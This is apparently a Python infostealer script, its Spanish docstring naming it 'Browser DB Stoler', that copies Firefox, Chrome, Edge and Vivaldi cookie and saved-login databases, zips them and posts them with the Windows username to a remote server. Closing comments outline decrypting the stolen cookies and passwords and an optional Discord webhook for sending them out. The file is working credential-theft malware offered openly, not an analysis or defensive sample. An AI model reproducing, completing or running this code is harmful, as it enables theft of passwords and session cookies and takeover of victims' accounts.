r"""
    Browser DB Stoler
    ~~~~~~~~~~~~~~~~~
    Roba bases de datos de navegadores web y los envia a un servidor.
    Navegadores compatibles:
        - Firefox
        - Cualquier navegador web basado en Chromium (Chrome, Edge, Vivaldi, etc...)

    @author Crizacio
    @website crizacio.com
    @date 17/10/2023
"""
import os, sys, subprocess
import configparser
import json
import cryptoactions as ca
from zipfile import ZipFile
if not os.name == "nt":
	sys.exit("This script only runs on Windows.")
try:
    import requests
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'requests'], stdout=subprocess.DEVNULL)
        import requests
    except:
        sys.exit()

SERVER_HOST_POST = None
def SetServerHostPost(host):
    global SERVER_HOST_POST
    SERVER_HOST_POST = host


def SendFile(filePath, BrowserName = None):
    try:
        with open(filePath, 'rb') as f:
            print(requests.post(SERVER_HOST_POST, files={"file": f}, data={"user": os.getlogin(), "browser": BrowserName}).text)
    except:
        print("Error: Can't send the file.")
        return None
def GetCurrentUserFolder():
    return os.path.expanduser('~')



# START - FIREFOX --------------------------------------------------
def GetFirefoxProfile():
    try:
        config = configparser.ConfigParser()
        config.read(str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\profiles.ini".format(GetCurrentUserFolder())))
        firefoxProfile = str(config['Profile0']['Path'].replace("/", "\\\\"))
        return firefoxProfile
    except:
        print("Error: Firefox profile not found.")
        return None

def GetFirefoxCookies():
    try:
        firefoxProfile = GetFirefoxProfile()
        firefoxPath = str("{}\\AppData\\Roaming\\Mozilla\\Firefox\\{}\\".format(GetCurrentUserFolder(), firefoxProfile))
        zipfilePath = str('{}.zip'.format(os.getlogin()))
        with ZipFile(zipfilePath, 'w') as zip_object:
            zip_object.write(str('{}{}'.format(firefoxPath, "cookies.sqlite")))
        SendFile(zipfilePath, "Firefox")
    except:
        print("Error: Firefox cookies not found.")
        return None
# END - FIREFOX --------------------------------------------------



# START - Chromium based --------------------------------------------------
def GetChromiumProfile(AppData_Path, BrowserName):
    try:
        f = open(str("{}\\AppData\\{}\\{}\\User Data\\{}".format(GetCurrentUserFolder(), AppData_Path, BrowserName, "Local State")))
        data = json.load(f)
        retorno = []
        for i in data['profile']['info_cache']:
            retorno.append(i)
        f.close()
        return retorno
    except:
        print("Error: Chromium '{}' profile not found.".format(BrowserName))
        return None
    
def GetChromiumCookies(AppData_Path, BrowserName):
    try:
        ChromiumProfile = GetChromiumProfile(AppData_Path, BrowserName)
        zipfilePath = str('{}.zip'.format(os.getlogin()))
        ChromiumPath = str("{}\\AppData\\{}\\{}\\User Data\\".format(GetCurrentUserFolder(), AppData_Path, BrowserName))
        with ZipFile(zipfilePath, 'w') as zip_object:
            zip_object.write(str('{}{}'.format(ChromiumPath, "Local State")))
            for profile in ChromiumProfile:
                ChromiumProfilePath = str("{}{}\\".format(ChromiumPath, profile))
                zip_object.write(str('{}{}'.format(ChromiumProfilePath, "Login Data")))
                zip_object.write(str('{}{}'.format(ChromiumProfilePath, "\\Network\\Cookies")))
        SendFile(zipfilePath, BrowserName)
    except:
        print("Error: Chromium '{}' cookies not found.".format(BrowserName))
        return None
# END - Chromium based --------------------------------------------------



# START - Common Chromium based webbrowsers --------------------------------------------------
def GetChromeCookies():
    GetChromiumCookies("Local\\Google", "Chrome")

def GetEdgeCookies():
    GetChromiumCookies("Local\\Microsoft", "Edge")

def GetVivaldiCookies():
    GetChromiumCookies("Local", "Vivaldi")
# END - Common Chromium based webbrowsers --------------------------------------------------



# START - CryptoActions for Chromium --------------------------------------------------

# 1) Copiar las cookies e inicios de sesion a una carpeta temporal
# 2) Reordenar los archivos copiados
#   - ROOT
#       - Chrome
#           - Default/
#               - Cookies
#               - Login Data
#           - Profile 1/
#               - Cookies
#               - Login Data
#           - Local State
#       - structure.json
# 3) Descifrar Cookies y Login Data
# 4) Escribir en structure.json datos relevantes.
#   - UserName
#   - Working Directory
#   - Temporal Directory
#   - Time and Date
#   - WebBrowser
#       - Name
#       - Install Directory
#       - User Data Directory
# 5) Comprimir ROOT
# 6) Enviar ZIP de ROOT al servidor
# 6.5) OPCIONAL: WebHook Discord.

# END - CryptoActions for Chromium --------------------------------------------------
